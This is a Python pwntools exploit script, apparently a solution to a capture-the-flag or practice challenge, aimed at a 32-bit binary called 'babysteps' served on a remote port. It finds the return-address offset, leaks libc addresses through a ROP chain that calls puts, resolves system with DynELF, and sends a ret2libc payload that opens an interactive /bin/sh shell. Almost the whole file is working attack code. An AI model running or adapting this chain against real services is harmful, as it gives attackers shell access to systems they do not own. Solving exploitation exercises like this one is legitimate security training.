#! /bin/env python3
from pprint import pprint
from pwn import *
context.terminal="./faketerm.py"
context.arch='i386'
context.bits=32
context.endian='little'
context.os='linux'

e=ELF("./babysteps_nopie_withsym32")
p=e.process()
#p=remote("scrap",55555)
#g=gdb.attach(target=p,gdbscript='''
#b babysteps.c:35
#''')
#p.interactive()

def find_offset(p, n=context.bits//8):
    p.clean()
    p.sendline(cyclic(1024, n=n))
    p.wait()
    core=p.corefile
    info("eip: %#x",core.eip)
    offset=cyclic_find(core.eip, n=n)
    info("eip offset: %d", offset)
    return offset

offset=find_offset(p)
#offset=28
p=remote("scrap",55555)

#print(f'got.puts @ {hex(e.symbols["got.puts"])}')
info("gots.puts @ %#x", e.symbols["got.puts"])
info("plt.puts @ %#x", e.symbols["plt.puts"])
info("ask_baby_name @ %#x", e.symbols["ask_baby_name"])

rop=ROP(e)
gadget_pop_ebx=rop.find_gadget(['pop ebx', 'ret'])[0]
gadget_pop_ret=rop.find_gadget(['ret'])[0]
info("gadget pop ebx @ %#x", gadget_pop_ebx)
msg=p.recvuntil(b"baby name?\n")
msg+=p.clean()
fixedlen=len(msg)+1 #+1 to include the newline when send the payload
print(msg.decode("latin1"), end="")
def leak(address):
    payload = [ 
                b"A"*offset,                      #padding
                p32(e.symbols["plt.puts"]),       #puts@plt
                #p32(0xDEADBEEF),
                p32(gadget_pop_ebx),              #gadget pop rdi +ret
                p32(address),                     #address
                p32(e.entrypoint)
                #p32(e.symbols["ask_baby_name"])   #&ask_baby_name
              ]
    #with open("./payload_fileZ","wb") as f:
    #    f.write(payload)
    #fixedlen=len(b'\nFirst, what is your baby name?\n')
    msg=b""
    count=0
    while (len(msg)-fixedlen<4):
        #sleep(3)
        payload[3]=p32(address+count)
        p.sendline(b"".join(payload))
        if count>0:
            msg=msg[0:len(msg)-fixedlen]+b'\x00'
        msg+=p.recvuntil(b"baby name?\n")
        msg+=p.clean()
        #print("****"*(count+1))
        #print(f"msg: {msg}")
        #print(f"msg length: {len(msg)}\nputs string len: {len(msg)-fixedlen}\n")
        #print(f"value: {msg[0:len(msg)-fixedlen]}")
        count=count+1
    value=msg[0:4]
    #print(f"value: {value}")
    return value
#p=e.process()
#print(p.recvuntil(b"baby name?\n").decode("utf-8"), end="")
#print(p.clean().decode("utf-8"), end="")
#p.sendline(payload)
#print(f"{payload}")
#leaked_addr=u64(p.recvline().rstrip().ljust(8,b"\x00"))
leaked_addr=leak(e.symbols["got.puts"])
info("puts @ %#x", u32(leaked_addr))
#g=gdb.attach(target=p,gdbscript='''
#p &main
#p &system
#''')
#p.interactive()
#main=0x08049267
#d=DynELF(leak, main, elf=e)
d=DynELF(leak, elf=e)
libc_base=d.lookup(None, 'libc')
info(f"libc base address @ %#x", libc_base)
system_addr=d.lookup('system', 'libc')
info(f"libc system address @ %#x", system_addr)
#read_addr=d.lookup('read', 'libc')
#info(f"libc read address @ %#x", read_addr)
##does not work because the tripe pop modifies the base pointer ebp
#gadget_triple_pop=rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
#info("gadget triple pop @ %#x", gadget_triple_pop)
#info("bss address @ %#x", e.bss())
#payload = [ 
#            b"A"*offset,
#            p32(read_addr),
#            p32(gadget_triple_pop), 
#            p32(0),
#            p32(e.bss()),
#            p32(8),
#            p32(system_addr),
#            p32(0xDEADBEAF),
#            p32(e.bss())
#          ]
#p.sendline(b"".join(payload))
#p.sendline(b"/bin/bash\x00")
libc=d.libc
#libc.address=libc_base
sh_addr=next(libc.search(b'/bin/sh'))
info(f"sh string address @ %#x", sh_addr)
#g=gdb.attach(target=p,gdbscript='''
#b babysteps.c:35        
#''')
#sleep(10)
payload = [ 
            b"A"*offset,
            p32(libc.symbols["system"]),
            p32(libc.symbols["exit"]), 
            p32(sh_addr)
          ]
p.sendline(b"".join(payload))
p.interactive()
